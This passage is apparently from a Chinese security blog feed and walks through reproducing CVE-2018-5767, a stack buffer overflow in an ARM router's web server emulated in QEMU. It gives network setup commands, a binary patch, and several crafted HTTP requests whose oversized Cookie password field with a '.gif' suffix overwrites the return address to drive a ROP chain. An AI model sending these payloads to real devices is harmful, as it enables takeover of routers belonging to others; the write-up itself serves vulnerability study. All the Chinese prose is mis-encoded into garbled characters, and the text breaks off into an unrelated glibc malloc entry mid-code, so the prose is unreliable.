<p>ä¸å‡ºæ„å¤–çš„è¯å°±èƒ½ä½¿ç”¨gdb è°ƒè¯•ç¨‹åºäº†ã€‚</p>
<h2 id="æ­å»ºç½‘ç»œç¯å¢ƒ"><a href="#æ­å»ºç½‘ç»œç¯å¢ƒ" class="headerlink" title="æ­å»ºç½‘ç»œç¯å¢ƒ"></a>æ­å»ºç½‘ç»œç¯å¢ƒ</h2><p><strong>æ“ä½œä¹‹å‰å…ˆæ‹æ‘„å¿«ç…§ï¼ï¼ï¼</strong></p>
<p>å¦‚æœä½ æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤æ“ä½œå®Œä¹‹åï¼Œè°ƒè¯•ç¨‹åºåº”è¯¥æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯å¾ˆå¯èƒ½ä¼šåœ¨ä¸€ä¸ªåä¸ºcheck_network å‡½æ•°ä¸Šé¢æ ½è·Ÿå¤´ï¼ŒæŒ‰ç…§å‡½æ•°åæ¥æ¨æµ‹ï¼Œå®ƒåº”è¯¥æ˜¯ç”¨æ¥æ£€æµ‹å½“å‰ç½‘ç»œè¿æ¥æ˜¯å¦å¯ç”¨çš„ï¼Œæˆ‘ä»¬è™½ç„¶æ­å»ºèµ·äº†è°ƒè¯•ç¯å¢ƒï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è®¾ç½®å¥½ç½‘ç»œç¯å¢ƒï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸ä¼šæ­£å¸¸å·¥ä½œ(è¿”å›å€¼ä¸º 0)ï¼Œå¦‚æœä½ å°è¯•å°†å®ƒçš„è¿”å›å€¼ä¿®æ”¹ä¸º 1ï¼Œç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯æœ€ç»ˆå‡ºç°çš„ IP åœ°å€ä¼šéå¸¸è¯¡å¼‚ï¼Œæˆ‘åˆ†åˆ«ä½¿ç”¨ä¸¤å°æœºå™¨è¿›è¡Œäº†å®éªŒï¼Œä¸€æ¬¡ IP åœ°å€ä½äºæ—¥æœ¬ï¼Œè€Œå¦ä¸€æ¬¡ä½äºå¢¨è¥¿å“¥â€¦..  è¿™å°±å¯¼è‡´ç¨‹åºæ— æ³•æ­£å¸¸æ¥æ”¶æˆ‘ä»¬çš„è¯·æ±‚ï¼Œæ²¡æ³•å„¿è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œäº†ã€‚</p>
<p>æ‰€ä»¥è¦å…ˆé…ç½®å¥½qemu çš„ç½‘ç»œå‚æ•°ï¼Œé¦–å…ˆå®‰è£…å¿…è¦çš„å·¥å…·</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure></div>

<p>æ¥ç€è¦ä¿®æ”¹ç½‘ç»œé…ç½®ï¼Œç¼–è¾‘&#x2F;etc&#x2F;network&#x2F;interfaces</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33  inet manual</span><br><span class="line">up ifconfig ens33  0.0.0.0 up</span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> bridge_ports ens33</span><br><span class="line"> bridge_maxwait 0 </span><br></pre></td></tr></table></figure></div>

<p>æ–°å»ºä¸€ä¸ªshell è„šæœ¬ &#x2F;etc&#x2F;qemu-ifup</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure></div>

<p>åˆ«å¿˜äº†ç»™è„šæœ¬è¶³å¤Ÿçš„æƒé™ï¼Œç„¶åé‡å¯ç½‘ç»œæœåŠ¡</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœå…¶ä¸­å“ªä¸€æ­¥æŠ¥é”™ï¼Œå°è¯•é‡å¯ä¸€ä¸‹è™šæ‹Ÿæœºã€‚</p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬çš„ç½‘ç»œç¯å¢ƒå°±é…ç½®å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å¼€å§‹ç€æ‰‹å¤ç°æ¼æ´ã€‚</p>
<h2 id="è§¦å‘æ¼æ´"><a href="#è§¦å‘æ¼æ´" class="headerlink" title="è§¦å‘æ¼æ´"></a>è§¦å‘æ¼æ´</h2><p>å¯åŠ¨ç¨‹åºçš„å‘½ä»¤</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -g 10000 ./bin/httpd</span><br></pre></td></tr></table></figure></div>

<p>å¯åŠ¨ä¹‹ååœ¨IDA ä¸­é€‰æ‹© remote GDB debugger ï¼Œé…ç½®ç›¸åº”çš„å‚æ•°ç„¶åè¿æ¥ä¸Šå»å³å¯è°ƒè¯•ã€‚</p>
<p>é¦–å…ˆè¯•è¯•çœ‹èƒ½ä¸èƒ½è§¦å‘æ¼æ´ï¼Œè®©ç¨‹åºå´©æºƒã€‚ç›´æ¥è¿è¡Œç¨‹åºæ—¶ä¼šè¾“å‡ºWeLoveLinux ï¼Œä¹‹åå°±æ²¡ä»€ä¹ˆååº”äº†ï¼ŒçŒœæµ‹è¿›å…¥äº†å‡æ­»çŠ¶æ€ï¼Œä½¿ç”¨ IDA æ‰¾åˆ°ç”¨åˆ°è¿™ä¸ªå­—ç¬¦ä¸²çš„ä½ç½®ä¸‹æ–­ç‚¹ï¼Œå•æ­¥çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-6.png"
                      alt="image"
                ></p>
<p>ç»è¿‡è°ƒè¯•æ¨æµ‹è¿™ä¸ªå‡½æ•°è¿æ¥äº†æŸä¸ªæœåŠ¡ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥ä¼šè¿”å›1ï¼Œä½†æ˜¯æˆ‘ä»¬ä½¿ç”¨ QEMU æ¨¡æ‹Ÿçš„ç¯å¢ƒï¼Œå®ƒè¿æ¥ä¸åˆ°ç›¸å…³æœåŠ¡ï¼Œå°±ä¼šè¿”å› 0ã€‚æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ patchï¼Œå¯ä»¥ä½¿ç”¨ IDA è‡ªå¸¦çš„ patchï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ keypatch æ’ä»¶ï¼Œå°†è¿”å›å€¼ patch æˆ 1ã€‚</p>
<p>patch å¥½ä¹‹åå°±å¯ä»¥æ­£å¸¸è¿è¡Œå•¦ï¼Œé™„ä¸€ä¸ªæˆªå›¾</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-7.png"
                      alt="image"
                ></p>
<p>å¦‚æœä½ çœ‹åˆ°ç±»ä¼¼çš„ç•Œé¢(ç‰¹åˆ«æ˜¯ IP åœ°å€ï¼Œä¸€èˆ¬æ˜¯ä½ çš„æœ¬æœºåœ°å€)ï¼Œé‚£å°±è¯´æ˜ç¯å¢ƒæ­å»ºçš„æ²¡æœ‰é—®é¢˜ã€‚</p>
<p>æ¥ç€åœ¨æœ‰æ¼æ´çš„å‡½æ•°R7WebsSecurityHandler å¼€å¤´æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œå…ˆæ‰“å¼€å…·æœ‰æ‹¦æˆªæ•°æ®åŒ…åŠŸèƒ½çš„è½¯ä»¶(æ¯”å¦‚ burp suite)ï¼Œç„¶åç”¨æµè§ˆå™¨è®¿é—® <code>http://&lt;IP&gt;/goform/execCommand</code></p>
<p>æŠ“ä¸€ä¸ªæ•°æ®åŒ…ï¼Œè¿™ä¸ªåŒ…çš„å†…å®¹åº”è¯¥å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>

<p>ä¸ºäº†è§¦å‘æ¼æ´ï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªCookie å­—æ®µï¼Œä¾‹å¦‚æˆ‘å°†æ•°æ®åŒ…æ”¹é€ ä¸º </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line">Cache-Control: max-age=0 </span><br></pre></td></tr></table></figure></div>

<p>é‡æ”¾æ•°æ®åŒ…ï¼Œè¿™æ—¶å€™ç¨‹åºåº”è¯¥ä¼šæ–­åœ¨R7WebsSecurityHandler å‡½æ•°å¤´éƒ¨ï¼Œå† F9 è¿è¡Œç¨‹åº(æ•´ä¸ªè¿‡ç¨‹ä¸­å¯èƒ½ä¼šå¼¹å‡ºä¸€äº›è­¦å‘Šï¼Œç›´æ¥å¿½ç•¥ï¼Œç„¶ååœ¨æ¥ä¸‹æ¥çš„çª—å£ä¸­ç‚¹å‡» pass to app)ï¼Œä¸å‡ºæ„å¤–çš„è¯ç¨‹åºä¼šç»ˆæ­¢è¿è¡Œï¼Œå¹¶ä¸”ç»ˆç«¯ä¸­ä¼šæ‰“å°å‡ºæ®µé”™è¯¯ã€‚</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-8.png"
                      alt="image"
                ></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•åˆ©ç”¨æ¼æ´äº†ï¼Œå…¶å®IoT çš„æ¼æ´å’Œ CTF ä¸­çš„ pwn é¢˜æ¯”è¾ƒç±»ä¼¼ï¼Œåˆ©ç”¨æ€è·¯ä¹Ÿæœ‰éƒ¨åˆ†ç›¸é€šä¹‹å¤„ï¼Œè¿‡ç¨‹ä¾æ—§æ˜¯å…ˆæ£€æŸ¥ä¿æŠ¤ï¼Œç„¶åå¯»æ‰¾æ¼æ´ï¼Œæ ¹æ®æ¼æ´ç±»å‹å’Œå¼€å¯çš„ä¿æŠ¤ç±»å‹æ‰¾åˆ°åˆé€‚çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ€åç¼–å†™ expã€‚</p>
<p>é¦–å…ˆè®©æˆ‘ä»¬çœ‹çœ‹æ¼æ´å‘ç”Ÿæ—¶stack ç©ºé—´çš„æƒ…å†µã€‚</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-9.png"
                      alt="image"
                ></p>
<p>ä¸Šå›¾æ˜¯sscanf ä¹‹å‰ï¼Œæˆ‘ä»¬çœ‹åˆ°å®ƒçš„ä¸‰ä¸ªå‚æ•°å’Œ IDA ä¼ªä»£ç è¯†åˆ«çš„ä¸€è‡´ï¼Œå•æ­¥æ­¥è¿‡ sscanfï¼Œç„¶åæ£€æŸ¥å¯¹åº”çš„æ ˆç©ºé—´å‘ç°å·²ç»è¢«å­—ç¬¦ a å¡«å……ï¼Œç»§ç»­å•æ­¥ï¼Œåœ¨æ­¥è¿‡ 0x2dd48 ä»£ç ä¹‹åå°±ä¼šè§¦å‘å¼‚å¸¸ï¼Œæ£€æŸ¥å¼‚å¸¸å‘ç”Ÿæ—¶çš„ç¨‹åºç¯å¢ƒï¼š</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-10.png"
                      alt="image"
                ></p>
<p>ç¨‹åºè¯•å›¾è®¿é—®r3 å¯„å­˜å™¨æŒ‡å‘çš„åœ°å€ï¼Œä½†æ˜¯æ­¤æ—¶ R3 å·²ç»å˜æˆäº† 0x61616161ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¡«å…¥çš„å†…å®¹ï¼Œç”±äºè®¿é—®äº†éæ³•åœ°å€ï¼Œå¯¼è‡´ç¨‹åºå‡ºé”™ï¼Œå¼‚å¸¸é€€å‡ºã€‚ </p>
<p>å‘ç”Ÿè¿™ç§æƒ…å†µå°±è¯´æ˜è¾“å…¥è¦†ç›–äº†stack ä¸Šçš„å…³é”®æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´æœ‰æœºä¼šé€šè¿‡ç²¾å¿ƒæ„é€ ä¸€äº›æ•°æ®æ¥æ§åˆ¶ç¨‹åºæµç¨‹ï¼å‚è€ƒç½‘ä¸Šçš„æ–‡ç« ï¼Œå¦‚æœ password å­—æ®µä¸­åŒ…å« .gif å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥ä»å½“å‰å‡½æ•°ä¸­ returnï¼Œè€Œä¸ä¼šè¿›å…¥åˆ°è¯»å…¥ R3 å¯„å­˜å™¨è¿™ä¸€æ”¯æµç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡æ–°æ„é€ ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ payload</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gif&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>

<p>å†æ¬¡å‘é€æ•°æ®åŒ…ï¼Œå´©æºƒæ—¶çš„æƒ…å†µå¦‚å›¾</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-11.png"
                      alt="image"
                ></p>
<p>å½“å‰çš„PC æŒ‡é’ˆ(ç›¸å½“äº x86 ä¸­çš„ EIP)æŒ‡å‘äº† 0x61616160ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¡«å……çš„å†…å®¹ã€‚</p>
<p>åˆ°è¿™é‡Œå¯ä»¥å¤§è‡´æ¨æµ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼Œåº”è¯¥æ˜¯ç”¨æ¥è¿‡æ»¤ä¸€äº›éæ³•è¾“å…¥çš„ï¼Œä½†æ˜¯ç”±äºæœ¬èº«çš„é€»è¾‘æ²¡æœ‰åšå¥½ï¼Œå¯¼è‡´æœ¬æ¥åº”è¯¥ä¿æŠ¤è½¯ä»¶å®‰å…¨çš„å‡½æ•°å´è‡ªå·±å‡ºäº†é—®é¢˜ã€‚</p>
<p>ä¸‹é¢éœ€è¦è®¡ç®—ä¸€ä¸‹åˆ°è¿”å›åœ°å€çš„åç§»ï¼Œé¦–å…ˆéœ€è¦çŸ¥é“ä¸€ä¸ªé‡è¦çš„çŸ¥è¯†ç‚¹ï¼Œå’Œx86 ä¸åŒï¼ŒARM æŒ‡ä»¤é›†åœ¨å‡½æ•°è¿”å›æ—¶å¹¶ä¸æ˜¯ä¾é å­˜å‚¨åœ¨æ ˆä¸Šçš„åœ°å€ï¼Œè€Œæ˜¯ä¾é  LR å¯„å­˜å™¨ï¼Œåªæœ‰ä¿®æ”¹äº† LR å¯„å­˜å™¨ï¼Œæ‰èƒ½åœ¨å‡½æ•°è¿”å›æ—¶æ§åˆ¶ç¨‹åºæµç¨‹ï¼Œå¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬åˆ†æçš„å‡½æ•°åœ¨è¿”å›æ—¶è°ƒç”¨äº† pop æŒ‡ä»¤ï¼Œå°†å­˜å‚¨åœ¨æ ˆä¸Šçš„åœ°å€å­˜æ”¾åˆ° LR å¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥ç»™äº†æˆ‘ä»¬æ§åˆ¶ç¨‹åºæµç¨‹çš„æœºä¼šã€‚æ„é€ ä»¥ä¸‹ payload</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbccccccccccccccccccccccccccccccccddddddddqqqqqqqqeeeeeeee22222222rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrraaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz1111222233334444555566667777888899990000!!!!@@@@####$$$$%%%%^^^^&amp;&amp;&amp;&amp;****(((())))~~~~````++++====____----&#123;&#123;&#123;&#123;&#125;&#125;&#125;&#125;[[[[]]]]////&gt;&gt;&gt;&gt;&lt;&lt;&lt;&lt;.gif&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>



<p>ç„¶åæ­£å¸¸æ“ä½œï¼Œå½“æ‰§è¡Œåˆ°pop æŒ‡ä»¤çš„æ—¶å€™è§‚å¯Ÿ stack å¦‚ä¸‹</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-12.png"
                      alt="image"
                ></p>
<p>é€šè¿‡å½“å‰çŠ¶æ€ï¼Œå¯ä»¥æ¨ç®—å‡ºpadding çš„é•¿åº¦ä¸º 447 ä¸ªå­—èŠ‚ã€‚</p>
<p>æœ‰äº†paddingï¼Œæ¥ä¸‹æ¥è¦è€ƒè™‘æ„é€  ROPï¼Œä¸ ctf ä¸­ä¸åŒçš„ä¸€ç‚¹æ˜¯è¿™ç§ web æœåŠ¡åœ¨å´©æºƒåä¸€èˆ¬ä¼šç«‹åˆ»é‡å¯ï¼Œå¹¶ä¸”é‡å¯ä¹‹åçš„ libc åœ°å€å’Œä¹‹å‰æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥çˆ†ç ´ libc æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æ”»å‡»æ‰‹æ®µï¼Œä¸è¿‡ qemu æ²¡åŠæ³•æä¾›è¿™ç§çˆ†ç ´ libc çš„æ¡ä»¶ã€‚</p>
<p>æˆ‘ä»¬å°è¯•æ‰‹åŠ¨ä¿®æ”¹ä¸€äº›åœ°å€ï¼Œæä¸€ä¸ªå¯ä»¥çœ‹åˆ°æ•ˆæœçš„åˆ©ç”¨é“¾ã€‚ </p>
<p>é¦–å…ˆè¿è¡Œåˆ°0x2de94 ï¼Œå•æ­¥èµ°å‡ æ¬¡åˆ° pop æŒ‡ä»¤ä¹‹å‰ï¼Œç„¶åä½¿ç”¨å‘½ä»¤ </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set &#123;int&#125;&lt;your stack address&gt; = &lt;target address&gt;</span><br></pre></td></tr></table></figure></div>

<p>ä¿®æ”¹å‡ ä¸ªstack çš„åœ°å€ï¼Œæ¯”å¦‚æˆ‘ä¿®æ”¹äº†å‡ ä¸ªåœ°å€å¦‚å›¾:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-13.png"
                      alt="image"
                ></p>
<p>å•æ­¥è¿è¡Œï¼Œä¼šåœ¨ç»ˆç«¯ä¸­çœ‹åˆ°æ•ˆæœ</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-14.png"
                      alt="image"
                ></p>
<p>æˆåŠŸæ‰§è¡Œäº†puts å‡½æ•°å¹¶è¾“å‡ºæˆ‘ä»¬çš„å†…å®¹ã€‚</p>
<p>payloadå¦‚ä¸‹ </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbbbbbbbbbbbbbbbbbfuckfuck&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>

<p>é™„ï¼šå†™å®Œæœ¬æ–‡ä¹‹åæˆ‘åˆè¿›è¡Œäº†å‡ æ¬¡è°ƒè¯•ï¼Œå‘ç°system å‡½æ•°å§‹ç»ˆä¸èƒ½æ­£å¸¸è¢«æ‰§è¡Œï¼ŒåŸå› æ˜¯ execve è¿™ä¸ªè°ƒç”¨ä¸€ç›´æç¤º No such file or directory .  google åˆ°å‡ ç¯‡æ–‡ç« ä¹Ÿæ²¡æœ‰å…·ä½“çš„è§£å†³åŠæ³•ï¼Œåˆæ­¥çŒœæµ‹æ˜¯ qemu æ¨¡æ‹Ÿç¯å¢ƒä¸å®Œå–„ï¼Œå¯¼è‡´æ‰¾ä¸åˆ° &#x2F;bin&#x2F;sh ï¼Œä¸çŸ¥é“åœ¨çœŸæœºä¸Šé¢èƒ½ä¸èƒ½å¾—åˆ°æ”¹å–„ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a class="link"   href="https://www.freebuf.com/vuls/160040.html" >https://www.freebuf.com/vuls/160040.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://bbs.pediy.com/thread-225671.htm" >https://bbs.pediy.com/thread-225671.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/wireless/166869.html" >https://www.freebuf.com/articles/wireless/166869.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>glibc ä¸­çš„ malloc ä¸ free æ¦‚è¿° (äºŒ)</title>
    <url>/2019/03/15/glibc_analyse2/</url>
    <content><![CDATA[<h2 id="malloc-ä¸­çš„-consolidate"><a href="#malloc-ä¸­çš„-consolidate" class="headerlink" title="malloc ä¸­çš„ consolidate"></a>malloc ä¸­çš„ consolidate</h2><p>åœ¨ malloc çš„æµç¨‹ä¸­æœ‰å‡ å¤„è°ƒç”¨åˆ°äº†è¿™ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯éå† fastbin é“¾è¡¨ï¼Œå°†å…¶ä¸­çš„å †å—è¿›è¡Œåˆå¹¶ï¼Œæ’å…¥åˆ° unsorted bin å½“ä¸­ã€‚</p>
<p>Update: 2020-11-02</p>
<span id="more"></span>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> __STD_C</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span 